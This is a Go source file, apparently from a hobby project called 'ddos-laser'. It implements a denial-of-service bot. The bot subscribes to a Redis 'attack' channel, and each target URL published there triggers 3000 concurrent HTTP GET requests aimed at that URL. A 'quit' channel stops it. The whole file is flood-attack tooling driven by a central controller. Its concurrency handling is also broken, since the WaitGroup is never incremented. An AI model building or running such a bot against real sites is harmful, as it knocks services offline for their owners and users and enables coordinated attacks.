package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"sync"

	"github.com/go-redis/redis"
	"github.com/michaeloverton/ddos-laser/internal/env"
	"github.com/sirupsen/logrus"
)

// Temporary constant till we solve the error:
// socket: too many open files
// possible reference:
// http://craigwickesser.com/2015/01/golang-http-to-many-open-files/
// https://mtyurt.net/post/docker-how-to-increase-number-of-open-files-limit.html
const maxRequests = 100

func main() {
	// Load the laser environment.
	env, err := env.LoadLaserEnv()
	if err != nil {
		log.Fatal("error loading environment: ", err.Error())
	}

	// Set up http client.
	httpClient := http.Client{}

	// Set up subscription client.
	subClient := redis.NewClient(&redis.Options{
		Addr:     env.RedisAddress,
		Password: "", // no password set
		DB:       0,  // use default DB
	})

	// Test connection to client.
	_, err = subClient.Ping().Result()
	if err != nil {
		log.Fatal("failed to connect to redis", err)
	}

	// Subscribe to the attack topic.
	attackTopic := subClient.Subscribe("topic")
	attackChan := attackTopic.Channel()

	// Subscribe to the quit topic.
	quitTopic := subClient.Subscribe("quit")
	quitChan := quitTopic.Channel()

	// When a message is received, attack target.
	for {
		select {
		case m := <-attackChan:
			var wg sync.WaitGroup
			for i := 0; i < 3000; i++ {
				go makeRequest(httpClient, m.Payload, &wg)
			}
			wg.Wait()
		case <-quitChan:
			logrus.Info("quitting")
			return
		}
	}
}

func makeRequest(c http.Client, URL string, wg *sync.WaitGroup) {
	//defer wg.Done()

	// Make 100 requests
	// for i := 0; i < 100; i++ {
	logrus.Infof("making request to: %s", URL)

	// Create the request to the target.
	req, err := http.NewRequest("GET", URL, nil)
	if err != nil {
		logrus.Errorf("failed to create request: %s", err)
		return
	}

	// Make the request.
	res, err := c.Do(req)
	if err != nil {
		logrus.Errorf("request failed: %s", err)
		return
	}
	defer res.Body.Close()

	// Decode the body for now.
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		logrus.Errorf("failed to read response body: %s", err)
		return
	}

	// Log body.
	logrus.Info("response code:", res.StatusCode)
	logrus.Info(string(body))
	// }

	wg.Done()

}
